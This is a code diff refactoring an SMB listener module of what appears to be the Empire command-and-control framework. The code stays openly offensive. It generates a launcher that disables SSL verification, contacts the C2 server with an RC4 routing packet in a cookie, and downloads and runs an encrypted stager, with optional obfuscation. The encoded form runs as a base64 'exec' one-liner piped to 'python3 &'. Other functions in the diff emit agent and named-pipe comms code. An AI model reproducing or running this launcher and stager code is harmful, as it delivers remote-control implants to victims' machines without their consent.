@@ -96,135 +96,131 @@ class Listener:
             log.error("listeners/template generate_launcher(): no language specified!")
             return None
 
-        if True:
-            active_listener = self
-            listenerOptions = active_listener.options
+        active_listener = self
+        listenerOptions = active_listener.options
 
-            host = listenerOptions["Host"]["Value"]
-            stagingKey = listenerOptions["StagingKey"]["Value"]
-            profile = listenerOptions["DefaultProfile"]["Value"]
-            uris = list(profile.split("|")[0].split(","))
-            stage0 = random.choice(uris)
-            customHeaders = profile.split("|")[2:]
+        host = listenerOptions["Host"]["Value"]
+        stagingKey = listenerOptions["StagingKey"]["Value"]
+        profile = listenerOptions["DefaultProfile"]["Value"]
+        uris = list(profile.split("|")[0].split(","))
+        stage0 = random.choice(uris)
+        customHeaders = profile.split("|")[2:]
 
-            if language.startswith("powershell"):
-                log.error(
-                    "Invalid language specification, only 'ironpython' is current supported for this module."
-                )
-                return None
+        if language.startswith("powershell"):
+            log.error(
+                "Invalid language specification, only 'ironpython' is current supported for this module."
+            )
+            return None
 
-            elif language in ["ironpython"]:
-                launcherBase = "import sys;"
-                if "https" in host:
-                    # monkey patch ssl woohooo
-                    launcherBase += "import ssl;\nif hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context;\n"
+        if language in ["ironpython"]:
+            launcherBase = "import sys;"
+            if "https" in host:
+                # monkey patch ssl woohooo
+                launcherBase += "import ssl;\nif hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context;\n"
 
-                try:
-                    if safe_checks.lower() == "true":
-                        launcherBase += listener_util.python_safe_checks()
-                except Exception as e:
-                    p = f"{listener_name}: Error setting LittleSnitch in stager: {e!s}"
-                    log.error(p, exc_info=True)
+            try:
+                if safe_checks.lower() == "true":
+                    launcherBase += listener_util.python_safe_checks()
+            except Exception as e:
+                p = f"{listener_name}: Error setting LittleSnitch in stager: {e!s}"
+                log.error(p, exc_info=True)
 
-                if user_agent.lower() == "default":
-                    profile = listenerOptions["DefaultProfile"]["Value"]
-                    user_agent = profile.split("|")[1]
+            if user_agent.lower() == "default":
+                profile = listenerOptions["DefaultProfile"]["Value"]
+                user_agent = profile.split("|")[1]
 
-                launcherBase += "import urllib.request;\n"
-                launcherBase += f"UA='{user_agent}';"
-                launcherBase += f"server='{host}';t='{stage0}';hop='{listener_name}';"
+            launcherBase += "import urllib.request;\n"
+            launcherBase += f"UA='{user_agent}';"
+            launcherBase += f"server='{host}';t='{stage0}';hop='{listener_name}';"
 
-                # prebuild the request routing packet for the launcher
-                routingPacket = packets.build_routing_packet(
-                    stagingKey,
-                    sessionID="00000000",
-                    language="PYTHON",
-                    meta="STAGE0",
-                    additional="None",
-                    encData="",
-                )
-                b64RoutingPacket = base64.b64encode(routingPacket).decode("utf-8")
+            # prebuild the request routing packet for the launcher
+            routingPacket = packets.build_routing_packet(
+                stagingKey,
+                sessionID="00000000",
+                language="PYTHON",
+                meta="STAGE0",
+                additional="None",
+                encData="",
+            )
+            b64RoutingPacket = base64.b64encode(routingPacket).decode("utf-8")
 
-                launcherBase += "req=urllib.request.Request(server+t);\n"
-                # add the RC4 packet to a cookie
-                launcherBase += "req.add_header('User-Agent',UA);\n"
-                launcherBase += (
-                    f"req.add_header('Cookie',\"session={b64RoutingPacket}\");\n"
-                )
-                launcherBase += "req.add_header('Hop-Name', hop);\n"
+            launcherBase += "req=urllib.request.Request(server+t);\n"
+            # add the RC4 packet to a cookie
+            launcherBase += "req.add_header('User-Agent',UA);\n"
+            launcherBase += (
+                f"req.add_header('Cookie',\"session={b64RoutingPacket}\");\n"
+            )
+            launcherBase += "req.add_header('Hop-Name', hop);\n"
 
-                # Add custom headers if any
-                if customHeaders != []:
-                    for header in customHeaders:
-                        headerKey = header.split(":")[0]
-                        headerValue = header.split(":")[1]
-                        # launcherBase += ",\"%s\":\"%s\"" % (headerKey, headerValue)
-                        launcherBase += (
-                            f'req.add_header("{headerKey}","{headerValue}");\n'
-                        )
+            # Add custom headers if any
+            if customHeaders != []:
+                for header in customHeaders:
+                    headerKey = header.split(":")[0]
+                    headerValue = header.split(":")[1]
+                    # launcherBase += ",\"%s\":\"%s\"" % (headerKey, headerValue)
+                    launcherBase += f'req.add_header("{headerKey}","{headerValue}");\n'
 
-                if proxy.lower() != "none":
-                    if proxy.lower() == "default":
-                        launcherBase += "proxy = urllib.request.ProxyHandler();\n"
-                    else:
-                        proto = proxy.Split(":")[0]
-                        launcherBase += (
-                            "proxy = urllib.request.ProxyHandler({'"
-                            + proto
-                            + "':'"
-                            + proxy
-                            + "'});\n"
-                        )
+            if proxy.lower() != "none":
+                if proxy.lower() == "default":
+                    launcherBase += "proxy = urllib.request.ProxyHandler();\n"
+                else:
+                    proto = proxy.Split(":")[0]
+                    launcherBase += (
+                        "proxy = urllib.request.ProxyHandler({'"
+                        + proto
+                        + "':'"
+                        + proxy
+                        + "'});\n"
+                    )
 
-                    if proxy_creds != "none":
-                        if proxy_creds == "default":
-                            launcherBase += "o = urllib.request.build_opener(proxy);\n"
-                        else:
-                            launcherBase += "proxy_auth_handler = urllib.request.ProxyBasicAuthHandler();\n"
-                            username = proxy_creds.split(":")[0]
-                            password = proxy_creds.split(":")[1]
-                            launcherBase += (
-                                "proxy_auth_handler.add_password(None,'"
-                                + proxy
-                                + "','"
-                                + username
-                                + "','"
-                                + password
-                                + "');\n"
-                            )
-                            launcherBase += "o = urllib.request.build_opener(proxy, proxy_auth_handler);\n"
-                    else:
+                if proxy_creds != "none":
+                    if proxy_creds == "default":
                         launcherBase += "o = urllib.request.build_opener(proxy);\n"
+                    else:
+                        launcherBase += "proxy_auth_handler = urllib.request.ProxyBasicAuthHandler();\n"
+                        username = proxy_creds.split(":")[0]
+                        password = proxy_creds.split(":")[1]
+                        launcherBase += (
+                            "proxy_auth_handler.add_password(None,'"
+                            + proxy
+                            + "','"
+                            + username
+                            + "','"
+                            + password
+                            + "');\n"
+                        )
+                        launcherBase += "o = urllib.request.build_opener(proxy, proxy_auth_handler);\n"
                 else:
-                    launcherBase += "o = urllib.request.build_opener();\n"
-
-                # install proxy and creds globally, so they can be used with urlopen.
-                launcherBase += "urllib.request.install_opener(o);\n"
-                launcherBase += "a=urllib.request.urlopen(req).read();\n"
-
-                # download the stager and extract the IV
-                launcherBase += listener_util.python_extract_stager(stagingKey)
-
-                if obfuscate:
-                    launcherBase = self.mainMenu.obfuscationv2.python_obfuscate(
-                        launcherBase
-                    )
-                    launcherBase = self.mainMenu.obfuscationv2.obfuscate_keywords(
-                        launcherBase
-                    )
-
-                if encode:
-                    launchEncoded = base64.b64encode(
-                        launcherBase.encode("UTF-8")
-                    ).decode("UTF-8")
-                    launcher = f"echo \"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('{launchEncoded}'));\" | python3 &"
-                    return launcher
-                else:
-                    return launcherBase
+                    launcherBase += "o = urllib.request.build_opener(proxy);\n"
             else:
-                log.error(
-                    "listeners/template generate_launcher(): invalid language specification: only 'powershell' and 'python' are current supported for this module."
+                launcherBase += "o = urllib.request.build_opener();\n"
+
+            # install proxy and creds globally, so they can be used with urlopen.
+            launcherBase += "urllib.request.install_opener(o);\n"
+            launcherBase += "a=urllib.request.urlopen(req).read();\n"
+
+            # download the stager and extract the IV
+            launcherBase += listener_util.python_extract_stager(stagingKey)
+
+            if obfuscate:
+                launcherBase = self.mainMenu.obfuscationv2.python_obfuscate(
+                    launcherBase
                 )
+                launcherBase = self.mainMenu.obfuscationv2.obfuscate_keywords(
+                    launcherBase
+                )
+
+            if encode:
+                launchEncoded = base64.b64encode(launcherBase.encode("UTF-8")).decode(
+                    "UTF-8"
+                )
+                return f"echo \"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('{launchEncoded}'));\" | python3 &"
+            return launcherBase
+
+        log.error(
+            "listeners/template generate_launcher(): invalid language specification: only 'powershell' and 'python' are current supported for this module."
+        )
+        return None
 
     def generate_stager(
         self,
@@ -263,8 +259,9 @@ class Listener:
             log.error(
                 "Invalid language specification, only 'ironpython' is current supported for this module."
             )
+            return None
 
-        elif language.lower() == "python":
+        if language.lower() == "python":
             template_path = [
                 os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
                 os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
@@ -298,14 +295,13 @@ class Listener:
                 return RC4IV + encryption.rc4(
                     RC4IV + stagingKey.encode("UTF-8"), stager.encode("UTF-8")
                 )
-            else:
-                # otherwise return the standard stager
-                return stager
+            # otherwise return the standard stager
+            return stager
 
-        else:
-            log.error(
-                "listeners/http generate_stager(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."
-            )
+        log.error(
+            "listeners/http generate_stager(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."
+        )
+        return None
 
     def generate_agent(
         self,
@@ -336,8 +332,9 @@ class Listener:
             log.error(
                 "Invalid language specification, only 'ironpython' is current supported for this module."
             )
+            return None
 
-        elif language == "python":
+        if language == "python":
             with open(
                 self.mainMenu.installPath + "/data/agent/ironpython_agent.py"
             ) as f:
@@ -364,10 +361,11 @@ class Listener:
                 code = self.mainMenu.obfuscationv2.obfuscate_keywords(code)
 
             return code
-        else:
-            log.error(
-                "Invalid language specification, only 'ironpython' is current supported for this module."
-            )
+
+        log.error(
+            "Invalid language specification, only 'ironpython' is current supported for this module."
+        )
+        return None
 
     def generate_comms(self, listenerOptions, language=None):
         """
@@ -382,34 +380,35 @@ class Listener:
 
         pipe_name = listenerOptions["PipeName"]["Value"]
 
-        if language:
-            if language.lower() == "powershell":
-                log.error(
-                    "Invalid language specification, only 'ironpython' is current supported for this module."
-                )
-
-            elif language.lower() == "python":
-                template_path = [
-                    os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
-                    os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
-                ]
-                eng = templating.TemplateEngine(template_path)
-                template = eng.get_template("smb/comms.py")
-
-                template_options = {
-                    "host": host,
-                    "pipe_name": pipe_name,
-                }
-
-                comms = template.render(template_options)
-                return comms
-
-            else:
-                log.error(
-                    "Invalid language specification, only 'ironpython' is current supported for this module."
-                )
-        else:
+        if not language:
             log.error("generate_comms(): no language specified!")
+            return None
+
+        if language.lower() == "powershell":
+            log.error(
+                "Invalid language specification, only 'ironpython' is current supported for this module."
+            )
+            return None
+
+        if language.lower() == "python":
+            template_path = [
+                os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
+                os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
+            ]
+            eng = templating.TemplateEngine(template_path)
+            template = eng.get_template("smb/comms.py")
+
+            template_options = {
+                "host": host,
+                "pipe_name": pipe_name,
+            }
+
+            return template.render(template_options)
+
+        log.error(
+            "Invalid language specification, only 'ironpython' is current supported for this module."
+        )
+        return None
 
     def start(self):
         """
@@ -427,7 +426,7 @@ class Listener:
                 )
 
                 if not agent:
-                    return
+                    return None
 
                 self.mainMenu.agenttasksv2.create_task_smb(
                     db, agent, name + "|" + self.options["PipeName"]["Value"]
@@ -443,36 +442,34 @@ class Listener:
                     db, parent_listener_name
                 )
 
-                if self.parent_listener:
-                    if self.parent_listener.module in ["http", "smb"]:
-                        self.options = copy.deepcopy(self.parent_listener.options)
-                        self.options["Name"]["Value"] = name
-                        self.options["Agent"] = tempOptions["Agent"]
-                        self.options["PipeName"] = tempOptions["PipeName"]
-
-                        # If default response exists on a parent then use it, else grab it from the primary listener
-                        active_listener = (
-                            self.mainMenu.listenersv2.get_active_listener_by_name(
-                                self.parent_listener.name
-                            )
-                        )
-                        try:
-                            self.b64DefaultResponse = active_listener.b64DefaultResponse
-                        except AttributeError:
-                            self.b64DefaultResponse = base64.b64encode(
-                                self.mainMenu.listenersv2.get_active_listener_by_name(
-                                    self.parent_listener.name
-                                )
-                                .default_response()
-                                .encode("UTF-8")
-                            )
-                        return True
-                    else:
-                        log.error("Parent listener must be a http listener")
-                        return False
-                else:
+                if not self.parent_listener:
                     log.error("Parent listener not found")
                     return False
+
+                if self.parent_listener.module not in ["http", "smb"]:
+                    log.error("Parent listener must be a http listener")
+                    return False
+
+                self.options = copy.deepcopy(self.parent_listener.options)
+                self.options["Name"]["Value"] = name
+                self.options["Agent"] = tempOptions["Agent"]
+                self.options["PipeName"] = tempOptions["PipeName"]
+
+                # If default response exists on a parent then use it, else grab it from the primary listener
+                active_listener = self.mainMenu.listenersv2.get_active_listener_by_name(
+                    self.parent_listener.name
+                )
+                try:
+                    self.b64DefaultResponse = active_listener.b64DefaultResponse
+                except AttributeError:
+                    self.b64DefaultResponse = base64.b64encode(
+                        self.mainMenu.listenersv2.get_active_listener_by_name(
+                            self.parent_listener.name
+                        )
+                        .default_response()
+                        .encode("UTF-8")
+                    )
+                return True
 
         except Exception:
             return False
